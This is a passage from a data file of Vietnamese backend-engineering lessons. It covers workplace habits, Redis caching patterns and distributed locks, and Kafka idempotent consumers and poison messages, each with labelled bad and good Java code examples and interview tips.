- Khi gặp blocker: Bắt buộc dành từ 15 đến 30 phút tự nghiên cứu (đọc stack trace, google mã lỗi, kiểm tra log, đặt breakpoint debug).
- Sau 30 phút nếu vẫn chưa tìm ra hướng đi: **BẮT BUỘC PHẢI ĐI HỎI NGAY**, tuyệt đối không ngồi mò tiếp một mình.

**Công thức đặt câu hỏi 4 phần chuyên nghiệp:**
1. **Bối cảnh (Goal):** Em đang triển khai tính năng gì / API nào?
2. **Triệu chứng & Mã lỗi (Symptom):** Lỗi gì xảy ra ở dòng code nào (đính kèm stack trace và correlation ID)?
3. **Những gì em đã thử (Attempts):** Em đã thử giải pháp A, B nhưng gặp kết quả C.
4. **Giả thuyết của em (Hypothesis):** Em nghi ngờ nguyên nhân là do X, anh có thể cho em xin 5 phút định hướng giúp em được không?`,
        badCodeTitle: '❌ Câu hỏi khiến Senior khó chịu và tốn thời gian',
        badCode: `"Anh ơi, code em bị lỗi 500 anh xem giúp em với!"
// Không log, không màn hình lỗi, không ngữ cảnh -> Senior phải bỏ dở việc để hỏi lại từ đầu!`,
        goodCodeTitle: '✅ Câu hỏi chuẩn kỹ sư giúp giải quyết vấn đề trong 2 phút',
        goodCode: `"Anh Nam ơi, em đang làm API checkout giỏ hàng (JIRA-204). Khi gọi saveOrder() thì bị DataIntegrityViolationException do cột user_id bị null.
Em đã debug thấy DTO đầu vào có user_id=12, nhưng sang Entity thì bị mất. Em đã kiểm tra mapping MapStruct nhưng chưa rõ tại sao trường này bị bỏ qua.
Khi nào anh tiện 5 phút, anh xem qua giúp em với ạ!"`,
        interviewTip: 'Trong phỏng vấn hành vi (Behavioral Interview), nếu được hỏi: "Khi gặp một vấn đề kỹ thuật khó mà em không biết giải quyết ra sao, em sẽ làm gì?", hãy trình bày chuẩn xác Quy tắc 15 phút và Công thức 4 phần này. Bạn sẽ thể hiện trọn vẹn sự chủ động (Proactiveness) và tính tôn trọng thời gian của đồng đội!'
      },
      {
        id: 'estimation-art',
        title: '2. Nghệ Thuật Estimate Task: Tại Sao Luôn Trễ Hạn & Công Thức Đệm Buffer',
        badge: 'Tránh Bị Đè Deadline',
        summary: 'Lập trình viên mới chỉ estimate thời gian gõ code (30%), quên mất 70% thời gian cho test, debug, code review và deploy.',
        explanation: `Lỗi kinh điển của Fresher:
Tech Lead hỏi: "Task này em làm mất bao lâu?"
Fresher nhẩm trong đầu: "Hàm này viết khoảng 4 tiếng là xong" -> Trả lời dõng dạc: "Dạ nửa ngày mai em xong ạ!"
Thực tế: Dính bug DB lạ mất nửa ngày, merge conflict mất 3 tiếng, Senior bắt sửa lại kiến trúc mất 1 ngày -> Tổng cộng mất 3 ngày mới merge được! Hậu quả: Bị đánh giá là thiếu năng lực và không đáng tin cậy.

**Quy luật Tảng Băng Chìm của phần mềm:**
- Thời gian gõ code thực tế chỉ chiếm **30%** tổng thời gian hoàn thành task!
- **70% còn lại** nằm ở:
  1. Đọc và hiểu code cũ / schema DB hiện tại (15%).
  2. Viết Unit Test và Mockito bao phủ các nhánh lỗi (20%).
  3. Tự test API trên Postman / Swagger và kiểm thử tích hợp (15%).
  4. Fix các comment góp ý trong quá trình Code Review (10%).
  5. Deploy lên môi trường Staging, hỗ trợ QA verify và xử lý merge conflict (10%).

👉 **Công thức vàng:** \`Estimate = (Thời gian code thuần túy) × 1.5 đến 2.0 (Buffer)\`!
Bàn giao trước hạn 2 tiếng luôn biến bạn thành "ngôi sao", còn trễ hạn nửa ngày sẽ khiến cả nhóm bị ảnh hưởng.`,
        badCodeTitle: '❌ Estimate ngây thơ chỉ tính lúc code thuận lợi',
        badCode: `// Nghĩ: "Viết CRUD User chỉ mất 2 tiếng" -> Báo cáo: "Chiều nay em xong!"
// Thực tế gặp lỗi Docker DB chết, conflict Git, QA trả vé -> Mất 2 ngày!`,
        goodCodeTitle: '✅ Phân rã task (WBS) và báo cáo có căn cứ',
        goodCode: `"Dạ task tạo đơn hàng này em ước tính mất 2 ngày:
- 0.5 ngày: Thiết kế DTO, Entity và viết migration Flyway.
- 0.5 ngày: Viết Service logic và tích hợp cổng thanh toán.
- 0.5 ngày: Viết Unit Test (Mockito) và MockMvc cho Controller.
- 0.5 ngày: Buffer dự phòng để giải quyết comment review và test cùng QA trên Staging."`,
        interviewTip: 'Khi phỏng vấn viên hỏi: "Nếu bạn nhận thấy một task chắc chắn sẽ bị trễ deadline, bạn sẽ làm gì?", hãy trả lời: "Em sẽ chủ động báo cáo với Tech Lead / PM ngay khi phát hiện nguy cơ (chậm nhất là buổi Daily Standup trước hạn), giải thích rõ nguyên nhân blocker và đề xuất giải pháp: giảm bớt phạm vi (descope) hoặc xin thêm người hỗ trợ, tuyệt đối không im lặng đến phút chót mới thông báo".'
      },
      {
        id: 'code-review-culture',
        title: '3. Văn Hóa Code Review: Đọc PR Văn Minh & Biến Góp Ý Thành Bàn Đạp',
        badge: 'Nâng Tầm Đẳng Cấp',
        summary: 'Tách bạch cái tôi cá nhân khỏi dòng code, sử dụng Conventional Comments và coi mỗi đợt review là một lớp học 1-kèm-1 miễn phí.',
        explanation: `Code Review không phải là cuộc thi "bắt bẻ" hay thể hiện quyền lực, mà là cơ chế bảo hiểm chất lượng cho sản phẩm và là nơi các kỹ sư học hỏi lẫn nhau.

**1. Tâm thế của người nhận review (Reviewee):**
- **You are not your code (Bạn không phải là dòng code của bạn):** Khi Senior comment "Đoạn này viết thế này làm sập DB", họ đang bảo vệ hệ thống khỏi lỗi, chứ không hề có ý hạ thấp con người bạn.
- **Không tự ái, không tranh cãi đôi co:** Thay vì gõ "Nhưng em thấy code em vẫn chạy bình thường", hãy mở lòng lắng nghe: "Em chưa tính tới trường hợp concurrency này, cảm ơn anh đã chỉ ra, em sẽ sửa lại bằng Pessimistic Lock".

**2. Tiêu chuẩn Conventional Comments khi review code đồng nghiệp:**
- \`praise:\` Khen ngợi một đoạn code viết thông minh, sáng sủa.
- \`nitpick:\` Góp ý nhỏ về format, đặt tên biến (không bắt buộc sửa).
- \`suggestion:\` Đề xuất cách viết tối ưu hơn kèm code mẫu giải thích tại sao.
- \`issue:\` Chỉ ra lỗi logic hoặc bảo mật bắt buộc phải sửa trước khi merge.
- \`question:\` Đặt câu hỏi để hiểu rõ hơn dụng ý của tác giả.`,
        badCodeTitle: '❌ Tranh cãi thiếu xây dựng hoặc comment cộc lốc',
        badCode: `// Reviewer comment: "Code viết như thế này mà cũng viết à?"
// Tác giả phản bác: "Chạy được là được rồi, anh rảnh quá hay sao đi bắt bẻ tên biến!"
// -> Phá vỡ tinh thần đoàn kết, gây ức chế môi trường làm việc.`,
        goodCodeTitle: '✅ Trao đổi chuyên nghiệp dựa trên dữ liệu kỹ thuật',
        goodCode: `// Reviewer:
suggestion: "Đoạn này gọi findById trong vòng lặp dễ dính N+1 Query. Em thử dùng findAllById(ids) để gom thành 1 câu SQL xem sao nhé."
// Tác giả:
"Cảm ơn anh Nam! Em đã refactor lại dùng findAllById() và benchmark thấy số lượng query giảm từ 50 xuống 1. Em đã update tại commit fe45a1, nhờ anh review lại giúp em ạ!"`,
        interviewTip: 'Nhắc đến cụm từ "Conventional Comments" và nguyên tắc "Blameless collaboration" trong phỏng vấn sẽ chứng minh bạn là người có kỹ năng làm việc nhóm (Team Player) cực kỳ trưởng thành.'
      },
      {
        id: 'incident-postmortem',
        title: '4. Xử Lý Sự Cố Production & Văn Hóa Blameless Post-mortem',
        badge: 'Kỹ Năng Cao Cấp',
        summary: 'Quy tắc "Rollback First, Debug Later", không đổ lỗi cá nhân mà tập trung vá lỗ hổng quy trình hệ thống.',
        explanation: `Bất kỳ kỹ sư phần mềm nào, kể cả CTO hay Principal Engineer, đều đã từng ít nhất một lần làm sập Production. Điều phân biệt một kỹ sư giỏi với một tay mơ nằm ở **cách họ phản ứng khi sự cố xảy ra**:

**Quy trình 4 bước xử lý sự cố chuẩn Big Tech:**
1. **Phát hiện & Báo động (Detect & Alert):** Nhận diện lỗi qua Datadog, Grafana hoặc khách hàng khiêu nại. Lập tức thông báo vào kênh #incident-production để toàn team nắm thông tin.
2. **Hồi phục tức thì (Mitigate First - Rollback First):**
   - Không ngồi mò mẫm debug khi hệ thống đang cháy!
   - Ưu tiên số 1: **Revert PR hoặc Rollback phiên bản Docker** về bản ổn định trước đó trong vòng 2 phút.
   - Bật cờ tắt tính năng (Feature Flag) hoặc bật trang bảo trì tạm thời.
3. **Điều tra nguyên nhân gốc rễ (Root Cause Analysis - RCA):** Sau khi Production đã an toàn, kéo log, traceId và heap dump về máy local để tái hiện và phân tích nguyên nhân kỹ thuật.
4. **Họp Blameless Post-mortem (Mổ băng sự cố không đổ lỗi):**
   - **Tư duy cốt lõi:** Con người luôn có thể sơ suất. Nếu một Fresher có thể làm sập toàn bộ hệ thống chỉ bằng 1 câu lệnh, thì lỗi thuộc về **HỆ THỐNG VÀ QUY TRÌNH** (thiếu test tự động, thiếu bước review, thiếu phân quyền DB) chứ KHÔNG PHẢI lỗi của cá nhân bạn đó!
   - Đưa ra các Action Items cụ thể để lỗi này KHÔNG BAO GIỜ lặp lại trong tương lai.`,
        badCodeTitle: '❌ Phản ứng hoảng loạn và văn hóa chỉ trích đổ lỗi',
        badCode: `// Hệ thống sập -> Giấu nhẹm đi, cố gắng commit code sửa vội -> Gây lỗi kép!
// Cuộc họp sau sự cố: "Tại thằng Nam push code ẩu làm công ty mất tiền!" (Văn hóa độc hại)`,
        goodCodeTitle: '✅ Hành động chuẩn mực theo quy trình Incident Management',
        goodCode: `// 1. Thông báo ngay: "[INCIDENT P1] API Payment đang trả lỗi 500 với tỉ lệ 40% từ lúc 14:15"
// 2. Rollback bản build 1.4.2 về 1.4.1 trong 90 giây -> Lỗi hết ngay.
// 3. Post-mortem Action Item:
//    - Thêm Integration Test cho luồng hoàn tiền đặc biệt.
//    - Cấu hình Alert Prometheus nếu tỉ lệ lỗi 5xx vượt quá 1% trong 3 phút.`,
        interviewTip: 'Khi phỏng vấn viên hỏi: "Kể về một lần bạn gây ra lỗi hoặc thất bại trong dự án?", hãy áp dụng chính xác tư duy Post-mortem này: Thẳng thắn thừa nhận sự cố, mô tả cách bạn phối hợp xử lý bình tĩnh, và quan trọng nhất là bạn đã rút ra bài học gì và cài đặt cơ chế phòng ngừa nào để lỗi đó vĩnh viễn không tái diễn.'
      }
    ]
  },
  {
    id: 'caching-redis',
    title: 'Redis & Kiến Trúc Caching Cao Cấp',
    icon: '⚡',
    accentColor: '#f43f5e',
    tagline: 'Tăng tốc độ truy vấn gấp 100 lần, làm chủ Cache-Aside, phòng chống Cache Penetration/Avalanche và Distributed Lock',
    topics: [
      {
        id: 'cache-aside-pattern',
        title: '1. Chiến Lược Cache-Aside: Đọc Ghi Chuẩn & Vấn Nạn Đồng Bộ Dữ Liệu',
        badge: 'Mẫu Kiến Trúc Bắt Buộc',
        summary: 'Đọc: Cache trước -> Miss thì đọc DB -> Lưu Cache. Ghi: Cập nhật DB trước -> XÓA Cache (không UPDATE cache) để tránh Race Condition.',
        explanation: `Trong các hệ thống có lưu lượng truy cập lớn, Database thường là nút thắt cổ chai (bottleneck) đầu tiên bị quá tải. Caching bằng Redis là vũ khí số 1 để giải cứu DB.
Mẫu thiết kế phổ biến nhất là **Cache-Aside (Lazy Loading)**:

**1. Luồng đọc (Read Path):**
1. Client gửi request tìm thông tin sản phẩm có ID = 10.
2. Ứng dụng kiểm tra trong Redis Cache trước:
   - **Cache Hit:** Trả về dữ liệu ngay lập tức (thời gian chỉ từ 1-2 mili-giây).
   - **Cache Miss:** Đọc dữ liệu từ Database (chậm hơn, tốn 50-100ms).
3. Ứng dụng ghi dữ liệu vừa đọc vào Redis kèm thời gian sống (**TTL**, ví dụ 30 phút) để phục vụ các request tiếp theo.

**2. Luồng ghi (Write Path) - Cạm bẫy sống còn:**
Khi người dùng cập nhật giá sản phẩm:
- ❌ **Sai lầm 1: Cập nhật DB xong CẬP NHẬT luôn Cache.**
  Nếu có 2 luồng A và B cùng sửa sản phẩm: Luồng A ghi DB trước, Luồng B ghi DB sau. Nhưng vì độ trễ mạng, Luồng B lại ghi Cache trước, Luồng A ghi Cache sau ➔ Cache đang lưu dữ liệu cũ của Luồng A trong khi DB lưu dữ liệu mới của Luồng B! Dữ liệu bị sai lệch vĩnh viễn!
- ❌ **Sai lầm 2: XÓA Cache trước rồi mới CẬP NHẬT DB.**
  Luồng A xóa cache -> Chưa kịp ghi DB thì Luồng B vào đọc -> Thấy cache rỗng -> Đọc DB cũ -> Nạp lại DB cũ vào Cache -> Luồng A ghi DB mới xong ➔ Cache lại bị bẩn (Dirty Read)!
- ✅ **Quy chuẩn đúng:** **Cập nhật Database thành công TRƯỚC ➔ Sau đó XÓA Cache (Cache Invalidation)!** Lần đọc tiếp theo sẽ tự động kích hoạt Cache Miss và kéo dữ liệu mới nhất từ DB lên.`,
        asciiDiagram: `[LUỒNG ĐỌC: Cache-Aside]
Client ──(1. Get ID=10)──> Server
                             ├──(2. Check Redis)──> [Redis Hit? Có ➔ Trả ngay 1ms]
                             │
                             └──(3. Cache Miss)───> [PostgreSQL: SELECT *]
                                                       │
                                   (4. Lưu Redis + TTL)│
                                   <───────────────────┘

[LUỒNG GHI: Cập Nhật DB -> XÓA Cache]
Client ──(1. Update Price)──> Server
                                ├──(2. UPDATE Database)──> [PostgreSQL: Commit thành công]
                                │
                                └──(3. DEL Key)──────────> [Redis: Xóa sạch cache]`,
        badCodeTitle: '❌ Cập nhật cache trực tiếp hoặc xóa cache trước DB',
        badCode: `@Transactional
public void updateProductPrice(Long id, BigDecimal newPrice) {
    // ❌ XÓA CACHE TRƯỚC: Rất dễ bị luồng khác đọc DB cũ rồi nạp lại cache rác!
    redisTemplate.delete("product:" + id);
    
    Product p = productRepo.findById(id).orElseThrow();
    p.setPrice(newPrice);
    productRepo.save(p);
    
    // ❌ HOẶC CẬP NHẬT CACHE TRỰC TIẾP: Dễ dính Race Condition ngược thứ tự ghi!
    redisTemplate.opsForValue().set("product:" + id, p);
}`,
        goodCodeTitle: '✅ Ghi DB trước rồi XÓA Cache kết hợp TTL đệm',
        goodCode: `@Transactional
public void updateProductPrice(Long id, BigDecimal newPrice) {
    Product p = productRepo.findById(id).orElseThrow();
    p.setPrice(newPrice);
    productRepo.save(p); // 1. Ghi Database thành công

    // 2. XÓA Cache sau khi DB đã commit thành công:
    redisTemplate.delete("product:" + id);
}

public ProductDto getProduct(Long id) {
    String cacheKey = "product:" + id;
    // 1. Kiểm tra cache
    ProductDto cached = (ProductDto) redisTemplate.opsForValue().get(cacheKey);
    if (cached != null) {
        return cached;
    }
    // 2. Cache miss -> Đọc DB và nạp cache kèm TTL 10 phút:
    ProductDto dbData = productRepo.findById(id).map(ProductDto::fromEntity).orElseThrow();
    redisTemplate.opsForValue().set(cacheKey, dbData, Duration.ofMinutes(10));
    return dbData;
}`,
        interviewTip: 'Khi phỏng vấn hỏi: "Làm sao đảm bảo tính nhất quán giữa Cache và DB nếu lệnh xóa Redis bị lỗi mạng?", hãy trả lời: "1. Luôn đặt TTL (thời gian sống) cho mọi key cache để dữ liệu tự hết hạn sau vài phút. 2. Với hệ thống tài chính yêu cầu cao, dùng Transactional Outbox Pattern hoặc CDC (Debezium đọc WAL log của MySQL/Postgres) để bắn event xóa cache qua Kafka với cơ chế retry bảo đảm".'
      },
      {
        id: 'cache-stampede-penetration',
        title: '2. Tam Đại Thảm Họa Cache: Avalanche, Breakdown, Penetration & Giải Pháp',
        badge: 'Chuẩn Sống Còn Big Tech',
        summary: 'Avalanche (ngàn key cùng hết hạn) -> Jitter TTL; Breakdown (Hot Key hết hạn) -> Mutex Lock; Penetration (query ID rác) -> Bloom Filter.',
        explanation: `Trong các sự kiện Mega Sale (11/11, Black Friday), hệ thống Caching có thể sụp đổ theo 3 kịch bản kinh hoàng sau:

**1. Cache Avalanche (Tuyết lở Cache):**
- **Nguyên nhân:** Hàng chục ngàn key cache được cài đặt cùng một thời điểm hết hạn (ví dụ đều hết hạn vào lúc 00:00:00). Đúng lúc nửa đêm, toàn bộ key cùng biến mất một lúc!
- **Hậu quả:** Hàng triệu request đồng loạt lao thẳng xuống Database ➔ Database sập trong 3 giây.
- **Giải pháp:** Thêm số giây ngẫu nhiên (**Random Jitter**) vào TTL: \`TTL = Base_TTL (10 phút) + Random(0 đến 120 giây)\`. Các key sẽ hết hạn rải rác, không bao giờ cùng chết một lúc.

**2. Cache Breakdown (Hot Key sụp đổ):**
- **Nguyên nhân:** Một sản phẩm cực Hot (ví dụ iPhone 16 giá 10k) có hàng trăm ngàn lượt truy cập mỗi giây. Đúng khoảnh khắc key đó vừa hết hạn TTL:
- **Hậu quả:** 50,000 request cùng thấy Cache Miss và cùng lúc chạy câu query phức tạp xuống Database để tái tạo cache ➔ Sập DB!
- **Giải pháp:** Dùng **Mutex Lock (Khóa phân tán)**: Chỉ cho phép request ĐẦU TIÊN được quyền truy vấn DB và ghi cache; 49,999 request còn lại phải chờ 50ms rồi thử đọc lại từ Cache.

**3. Cache Penetration (Xuyên thủng Cache):**
- **Nguyên nhân:** Kẻ xấu cố tình tấn công bằng cách gửi hàng loạt request với ID không hề tồn tại trong hệ thống (ví dụ: \`id = -9999\` hoặc UUID ngẫu nhiên).
- **Hậu quả:** Cache miss ➔ Đọc DB cũng miss ➔ Không có dữ liệu để ghi vào Cache ➔ Lần request tiếp theo lại tiếp tục đập vào DB!
- **Giải pháp:**
  - **Cache Null Object:** Lưu giá trị rỗng/null vào Redis với TTL ngắn (1-2 phút).
  - **Bloom Filter:** Dùng cấu trúc dữ liệu Bloom Filter để kiểm tra trước xem ID đó có khả năng tồn tại hay không. Nếu Bloom Filter bảo "Không có" thì từ chối ngay lập tức mà không cần hỏi Cache lẫn DB!`,
        badCodeTitle: '❌ TTL cố định và không chặn query ID rác',
        badCode: `// ❌ Nguy cơ Avalanche: Tất cả key đều có TTL đúng 3600 giây!
redisTemplate.opsForValue().set(key, data, Duration.ofSeconds(3600));

// ❌ Nguy cơ Penetration: ID rỗng không lưu cache -> Tiếp tục để hacker đập DB!
User user = userRepo.findById(id).orElse(null);
if (user != null) {
    redisTemplate.opsForValue().set(key, user);
}`,
        goodCodeTitle: '✅ Jitter TTL và phòng vệ Cache Penetration toàn diện',
        goodCode: `// ✅ 1. Khắc phục Avalanche: Thêm Random Jitter vào TTL:
long baseSeconds = 1800; // 30 phút
long jitterSeconds = ThreadLocalRandom.current().nextLong(0, 300); // Thêm 0-5 phút ngẫu nhiên
redisTemplate.opsForValue().set(key, data, Duration.ofSeconds(baseSeconds + jitterSeconds));

// ✅ 2. Khắc phục Penetration: Cache Null Object với TTL ngắn (2 phút):
User user = userRepo.findById(id).orElse(null);
if (user != null) {
    redisTemplate.opsForValue().set(key, user, Duration.ofMinutes(30));
} else {
    // Lưu giá trị đặc biệt "NULL_MARKER" để chặn các request rác tiếp theo:
    redisTemplate.opsForValue().set(key, "NULL_MARKER", Duration.ofMinutes(2));
}`,
        interviewTip: 'Hãy giải thích rành mạch sự khác biệt: "Breakdown là 1 Hot Key duy nhất bị chết; Avalanche là hàng loạt key cùng chết một lúc; còn Penetration là query dữ liệu rác không hề tồn tại". Nêu được cả 3 kèm giải pháp Bloom Filter / Jitter TTL sẽ gây ấn tượng cực kỳ mạnh mẽ với Solution Architect!'
      },
      {
        id: 'redis-distributed-lock',
        title: '3. Khóa Phân Tán (Distributed Lock) Với Redisson & Chống Tranh Chấp',
        badge: 'Kiến Trúc Microservices',
        summary: 'synchronized trong Java chỉ khóa được 1 máy đơn lẻ. Khi scale 5 Pod Kubernetes, bắt buộc dùng Redisson Distributed Lock có Watchdog.',
        explanation: `Khi chạy ứng dụng ở máy local, bạn có thể dùng từ khóa \`synchronized\` hoặc \`ReentrantLock\` để ngăn ngừa Race Condition.
Tuy nhiên, khi lên môi trường Production, ứng dụng của bạn được nhân bản thành **5 hoặc 10 Pod (Instances)** chạy sau một Load Balancer:
- Luồng 1 ở Pod A và Luồng 2 ở Pod B chạy trên 2 máy chủ vật lý khác nhau, 2 JVM khác nhau hoàn toàn!
- Từ khóa \`synchronized\` chỉ có tác dụng trong nội bộ 1 JVM duy nhất ➔ Cả 2 Pod cùng lúc trừ kho hàng ➔ Gãy toàn bộ logic kinh doanh!

**Giải pháp: Redis Distributed Lock**
Tất cả các Pod cùng nhìn vào một máy chủ Redis tập trung để xin cấp quyền sở hữu tài nguyên:

**Cạm bẫy khi tự viết Lock bằng \`SETNX\`:**
- \`SETNX lock_key my_id EX 10\`: Khóa tự hết hạn sau 10 giây để tránh Deadlock nếu server bị crash.
- **Nguy cơ:** Nếu tác vụ xử lý mất 12 giây (do GC pause hoặc gọi ngân hàng bị lag) ➔ Lock bị nhả sớm trong khi tác vụ chưa chạy xong ➔ Pod khác nhảy vào làm loạn dữ liệu! Sau đó Pod 1 chạy xong lại xóa nhầm lock của Pod 2!

**Giải pháp chuẩn Big Tech: Thư viện Redisson & Cơ chế Watchdog**
- Redisson tự động khởi chạy một tiến trình ngầm (**Watchdog**).
- Khi bạn giữ lock, cứ sau mỗi 10 giây, Watchdog sẽ tự động gia hạn thời gian sống của lock thêm 30 giây (Lock Lease Renewal).
- Lock chỉ được giải phóng khi code chạy xong và gọi \`unlock()\`, hoặc khi tiến trình bị crash đột ngột (Watchdog chết ➔ lock tự hết hạn an toàn).`,
        badCodeTitle: '❌ Dùng synchronized trên hệ thống Microservices nhiều Pod',
        badCode: `@Service
public class OrderService {
    // ❌ VÔ DỤNG khi scale 2 Pod trên Kubernetes:
    // Pod 1 và Pod 2 có 2 JVM độc lập, không thể khóa nhau được!
    public synchronized void bookSeat(Long showtimeId, String seatNumber) {
        // ... logic đặt ghế bị trùng lặp khi 2 user gửi request vào 2 Pod khác nhau!
    }
}`,
        goodCodeTitle: '✅ Redisson Distributed Lock an toàn tuyệt đối đa máy chủ',
        goodCode: `@Service
@RequiredArgsConstructor
public class TicketBookingService {
    private final RedissonClient redissonClient;

    public void bookSeatDistributed(Long showtimeId, String seatNumber) {
        String lockKey = "lock:showtime:" + showtimeId + ":seat:" + seatNumber;
        RLock lock = redissonClient.getLock(lockKey);

        try {
            // Chờ tối đa 5 giây để lấy lock, nếu lấy được thì giữ lock (Watchdog tự động gia hạn)
            boolean isLocked = lock.tryLock(5, -1, TimeUnit.SECONDS);
            if (!isLocked) {
                throw new ConflictException("Ghế đang có người khác thanh toán, vui lòng chọn ghế khác!");
            }

            // Thực hiện nghiệp vụ kiểm tra và trừ vé an toàn trên toàn cụm server:
            processSeatReservation(showtimeId, seatNumber);

        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
            throw new SystemException("Bị gián đoạn trong lúc giữ khóa");
        } finally {
            // Luôn đảm bảo chỉ giải phóng lock nếu chính luồng này đang sở hữu nó:
            if (lock.isHeldByCurrentThread()) {
                lock.unlock();
            }
        }
    }
}`,
        interviewTip: 'Khi phỏng vấn hỏi: "Thuật toán Redlock là gì?", hãy trả lời: "Redlock là thuật toán do tác giả Redis đề xuất để đảm bảo độ tin cậy của Distributed Lock trên cụm Redis đa node (Cluster/Sentinel), yêu cầu lấy được lock trên đa số máy (N/2 + 1 node) để tránh trường hợp Master bị crash khi dữ liệu chưa kịp replicate sang Slave".'
      }
    ]
  },
  {
    id: 'kafka-event-driven',
    title: 'Kafka & Hệ Thống Hướng Sự Kiện (Event-Driven)',
    icon: '📨',
    accentColor: '#0ea5e9',
    tagline: 'Xử lý hàng triệu message/giây, kiến trúc decoupled microservices, Dead Letter Queue và Idempotent Consumer',
    topics: [
      {
        id: 'kafka-consumer-idempotency',
        title: '1. Idempotent Consumer: Xử Lý Message Trùng Lặp Chuẩn At-least-once Delivery',
        badge: 'Quy Tắc Vàng Kafka',
        summary: 'Kafka cam kết At-least-once khiến message có thể bị gửi lại nhiều lần. Consumer bắt buộc phải có tính Idempotent để không trừ tiền 2 lần.',
        explanation: `Trong hệ thống phân tán, sự cố mạng là điều chắc chắn sẽ xảy ra.
Kafka mặc định hoạt động theo mô hình **At-least-once Delivery (Giao hàng ít nhất một lần)**:

**Kịch bản sinh ra Message trùng lặp:**
1. Consumer nhận được message: \`{ event: "PAYMENT_CHARGED", orderId: 88, amount: 500k }\`.
2. Consumer trừ tiền tài khoản thành công và ghi sổ cái.
3. Consumer chuẩn bị gửi tín hiệu commit Offset về Kafka Broker thì mạng bị rớt hoặc tiến trình Consumer bị Restart đột ngột!
4. Kafka Broker không nhận được commit Offset, coi như message này chưa được xử lý xong.
5. Sau khi kết nối lại (Consumer Rebalance), Kafka gửi lại **chính xác message đó** cho Consumer một lần nữa!
6. Nếu Consumer không có tính chất **Idempotency (Tính bất biến)** ➔ Khách hàng bị trừ tiền lần 2!

**3 Cách hiện thực Idempotent Consumer:**
1. **Unique Constraint ở tầng Database:** Dùng cột \`transaction_id\` hoặc \`event_id\` làm khóa chính (\`PRIMARY KEY\`) trong bảng lịch sử giao dịch. Nếu bị gửi lại, lệnh \`INSERT\` sẽ ném ngoại lệ \`DuplicateKeyException\`, Consumer phát hiện và bỏ qua một cách an toàn.
2. **Idempotency Key với Redis \`SETNX\`:** Trước khi xử lý, dùng \`redis.setIfAbsent("event:" + eventId, "PROCESSING", 24, TimeUnit.HOURS)\`. Nếu trả về \`false\` tức là sự kiện này đã hoặc đang được xử lý bởi luồng khác.
3. **Optimistic Conditional Update:** Dùng câu lệnh SQL có điều kiện: \`UPDATE orders SET status = 'PAID' WHERE id = ? AND status = 'PENDING'\`. Nếu trạng thái đã là 'PAID' rồi thì số dòng cập nhật là 0 ➔ Không làm gì thêm.`,
        asciiDiagram: `[Kafka Topic: orders] ──(Message: EventID=E-901, OrderID=12)──> [Consumer Service]
                                                                        │
                                       ┌────────────────────────────────┴────────────────────────────────┐
                                       │ Kiểm tra: redis.setIfAbsent("evt:E-901", "DONE", 24h)           │
                                       └────────────────────────────────┬────────────────────────────────┘
                                                                        │
                                           ┌────────────────────────────┴────────────────────────────┐
                                           ▼                                                         ▼
                             [Kết quả: TRUE (Chưa từng xử lý)]                       [Kết quả: FALSE (Đã xử lý rồi)]
                                           │                                                         │
                             1. Trừ tiền & Cập nhật Database                                         1. Log Warning: "Duplicate Message"
                             2. Commit Offset lên Kafka ✅                                          2. Bỏ qua & Commit Offset ngay ✅
                                                                                                        (Khách hàng KHÔNG bị trừ tiền 2 lần!)`,
        badCodeTitle: '❌ Consumer xử lý ngây thơ gây trừ tiền lặp lại',
        badCode: `@KafkaListener(topics = "payment-events")
public void handlePayment(PaymentEvent event) {
    // ❌ KHÔNG KIỂM TRA IDEMPOTENCY:
    // Nếu mạng chập chờn broker gửi lại tin này -> Khách hàng bị trừ tiền lần 2!
    walletService.deductBalance(event.userId(), event.amount());
    orderService.markAsPaid(event.orderId());
}`,
        goodCodeTitle: '✅ Idempotent Consumer dựa trên Database Unique Constraint',
        goodCode: `@Service
@RequiredArgsConstructor
@Slf4j
public class SafePaymentConsumer {
    private final ProcessedEventRepository eventRepo;
    private final WalletService walletService;

    @KafkaListener(topics = "payment-events", groupId = "wallet-group")
    @Transactional
    public void handlePaymentSafe(ConsumerRecord<String, PaymentEvent> record) {
        PaymentEvent event = record.value();
        String eventId = event.eventId();

        // 1. Kiểm tra bảng sự kiện đã xử lý (hoặc dùng INSERT IGNORE / ON CONFLICT DO NOTHING):
        if (eventRepo.existsById(eventId)) {
            log.warn("Phát hiện message trùng lặp đã xử lý trước đó | eventId={}", eventId);
            return; // Bỏ qua an toàn mà không trừ tiền lần nữa
        }

        // 2. Thực hiện trừ tiền nghiệp vụ:
        walletService.deductBalance(event.userId(), event.amount());

        // 3. Đánh dấu event đã xử lý trong cùng 1 Transaction:
        eventRepo.save(new ProcessedEvent(eventId, "WALLET_DEDUCTED", Instant.now()));
    }
}`,
        interviewTip: 'Hãy phân biệt rõ: "Kafka có tính năng Exactly-once Semantics (EOS) qua Transaction Coordinator, nhưng nó chỉ có hiệu lực trong phạm vi Kafka-to-Kafka (đọc từ Kafka topic A rồi ghi sang Kafka topic B). Khi Consumer tương tác với Database ngoài hoặc gọi bên thứ 3 (Email, SMS), bắt buộc phải xử lý Idempotency ở tầng ứng dụng".'
      },
      {
        id: 'kafka-dlq-poison-pill',
        title: '2. Xử Lý Poison Message & Chiến Lược Dead Letter Queue (DLQ)',
        badge: 'Phòng Vệ Treo Hệ Thống',
        summary: 'Message hỏng format (Poison Pill) khiến Consumer văng Exception liên tục và kẹt cứng Offset. Dùng DeadLetterPublishingRecoverer để cách ly.',
        explanation: `Một trong những sự cố tồi tệ nhất khi vận hành Kafka là **Poison Pill (Viên thuốc độc)**:
- **Poison Pill là gì?** Là một message có cấu trúc dị dạng nằm trong topic (ví dụ: JSON bị cụt dòng, thiếu trường bắt buộc, hoặc sai định dạng ngày tháng).
- **Hậu quả thảm khốc:**
  1. Consumer đọc message hỏng ➔ Ném \`SerializationException\` hoặc \`NullPointerException\`.
  2. Vì có lỗi ném ra, Consumer **không thể commit Offset**.
  3. Lần poll tiếp theo, Consumer lại đọc đúng ngay vị trí Offset chưa commit đó!
  4. Lại ném lỗi ➔ Lại đọc lại ➔ Vòng lặp vô tận (Infinite Retry Loop)!
  5. **Toàn bộ Consumer trong nhóm bị nghẽn cứng tại message đó**, không thể đọc tiếp các message bình thường phía sau. **Consumer Lag** vọt lên hàng triệu tin nhắn!

**Giải pháp chuẩn Big Tech: Dead Letter Queue (DLQ / DLT)**
- Cấu hình cơ chế Retry thông minh có giới hạn: Thử lại 3 lần kèm khoảng thời gian chờ (Backoff: 1s, 2s, 4s).
- Nếu sau 3 lần vẫn lỗi: **Không được để sập Consumer!**
